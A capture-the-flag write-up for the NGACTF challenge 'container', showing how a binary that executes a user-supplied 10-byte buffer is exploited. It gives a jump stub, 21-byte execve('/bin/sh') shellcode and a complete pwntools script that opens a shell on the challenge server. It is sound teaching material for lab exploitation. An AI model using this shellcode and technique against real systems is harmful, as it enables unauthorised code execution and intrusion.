This is a writeup for the [NGACTF](https://nicerc.org/events/nga-capture-the-flag/) challenge *container*.
For this challenge the only file provided is an executiable binary.
### Inital steps
The best idea is to first get a basic idea of what security mesaures are already present in the binary so we know what is feasible and what is not. Running checksec will provide exactly the information we desire. 
>troy@troyscomputer$ checksec container
>    Arch:     i386-32-little
>    RELRO:    Partial RELRO
>    Stack:    No canary found
>    NX:       NX disabled
>    PIE:      PIE enabled
>    RWX:      Has RWX segments

We can see that there are no stack canarries (so buffer overflows will be possible) as well as NX is disabled so the stack is executiable. 
### Getting a closer look
As they didn't provide source code, let's get a better look at whats going on by firing up [Ghidra](https://ghidra-sre.org/)
```c
int main() {
  char buf [5];
  char buf60 [60];
  code buf10 [10];
  void* code;
  do {
    printf("Choose a command:\n1: Use premium storage container 1\n2: Use premium storage container2\n3: Use secondary storage box\n4: Run the contents of your premium storage container\n>");
    fflush(stdout);
    fgets(buf,5,stdin);
    if (buf[0] == '1') {
      puts("This container provides 10 bytes of premium storage.");
      fflush(stdout);
      puts("A premium storage container allows you to run your content, too!");
      fflush(stdout);
      printf("Go ahead and store your content: ");
      fflush(stdout);
      fgets((char *)buf10,10,stdin);
    }
    if (buf[0] == '2') {
      printf("Sorry, but this container is already in use. You can use the premium storage incontainer1.");
      fflush(stdout);
    }
    if (buf[0] == '3') {
      puts("This storage box is for 50 bytes of extra content. You can\'t run it, but it won\'t takeup your premium storage space.");
      fflush(stdout);
      printf("Go ahead and store your content: ");
      fflush(stdout);
      fgets(buf60,50,stdin);
    }
    if (buf[0] == '4') {
      puts("Okay, I\'ll run the contents of your premium container!");
      fflush(stdout);
      code = buf10;
      (*(code *)code)();
    }
  } while( true );
}
```
The code looks pretty simple. It is contained entierly inside the main function which continually asks the user to pick an option that executes the desired function. Choosing "1" writes at most 10 bytes into buf10, "3" does the same for buf60, "2" does nothing for our purposes, and "4" *EXECUTES* buf10!
```c
puts("Okay, I\'ll run the contents of your premium container!");
fflush(stdout);
code = buf10;
(*(code *)code)();
```
Be sure to review [C function pointers](https://www.learn-c.org/en/Function_Pointers) if the syntax `(*(code *)code)();` looks *too* cryptic.
Great. All we need to do is select option 1, enter some x86 linux shellcode that gives a shell, select 4 to run our code, a shell pops up, and we get the flag!
[Shell Storm](http://shell-storm.org/shellcode/) is a great website that houses short snipits of machine code that do specific things. As this is a 32 bit linux executable we only want shellcode that for x86 linux.
[This shellcode](http://shell-storm.org/shellcode/files/shellcode-752.php) is perferect for our needs. It is equilivant to execve("/bin/sh") and happens to be nice and short at 21 bytes. Unfourtantly this is too long for buf10 because `fgets((char *)buf10,10,stdin);` will copy at most 9 characters into buf10 (don't forget the null-byte). However we can put the longer shell code into the bigger buffer and put code that simply jumps to the larger buffer into the 10 byte buffer.
The disassembly in Ghidra before the fgets call will tell us that the 60 byte buffer always starts 0x52 bytes below EBP.
```
LEA        EAX=>buf60,[EBP -0x52]
PUSH       EAX
CALL       fgets
```
The code we need will have to jump to EBP -0x52 in order to invoke the 21 byte shellcode there. With the help of [this website](https://defuse.ca/online-x86-assembler.htm) creating the machine code is easy.
```
mov    eax,ebp
sub    eax,0x52
jmp    eax
```
This assembler copies the stack base pointer (EBP) into eax then subtracts 0x52 (now eax points to the 60 byte buffer), finally the last instruction jumps there and starts executing our shellcode.
Clicking assemble gives us "\x89\xE8\x83\xE8\x52\xFF\xE0", the actual bytes of the machine code which will be executed by `(*(code *)code)();`
### Creating the exploit

Using pwn tools we can easily create a connect script the connects to their server and gives it our juicy code. The script is as easy as defining some constants and importing pwn tools,
```python
from pwn import *
shell = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

jmp60 = "\x89\xE8\x83\xE8\x52\xFF\xE0"
```
Connectint to the remote server and waiting for the prompt,
```python
r = remote("golf.virginiacyberrange.net", 40149)
r.recvuntil(">")
```
Choosing 1 and uploading the `jmp EBP-0x52` code
```python
r.sendline("1")
r.recvuntil("Go ahead and store your content:")
r.sendline(jmp60)
```
Choosing 3 and sending the shellcode,
```python
r.recvuntil(">")
r.sendline("3")
r.recvuntil("Go ahead and store your content:")
r.sendline(shell)
```
And selecting 4 to run our jmp + shellcode:
```python
r.recvuntil(">")
r.sendline("4")
print(r.recvline())
r.interactive()
```
A sample run:
```
troy@troyscomputer$ python maker.py
[+] Opening connection to golf.virginiacyberrange.net on port 40149: Done
Okay, I'll run the contents of your premium container!

[*] Switching to interactive mode
$ ls
bin
container
dev
flag
lib
lib32
lib64
$ cat flag
flag{ju5t_4_h0p_sk1p_and_4_jmp_to_exploit}
```

Heres the entire script:
```python
from pwn import *
shell = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

jmp60 = "\x89\xE8\x83\xE8\x52\xFF\xE0"

r = remote("golf.virginiacyberrange.net", 40149)
r.recvuntil(">")

r.sendline("1")
r.recvuntil("Go ahead and store your content:")
r.sendline(jmp60)

r.recvuntil(">")
r.sendline("3")
r.recvuntil("Go ahead and store your content:")
r.sendline(shell)

r.recvuntil(">")
r.sendline("4")
print(r.recvline())
r.interactive()
```
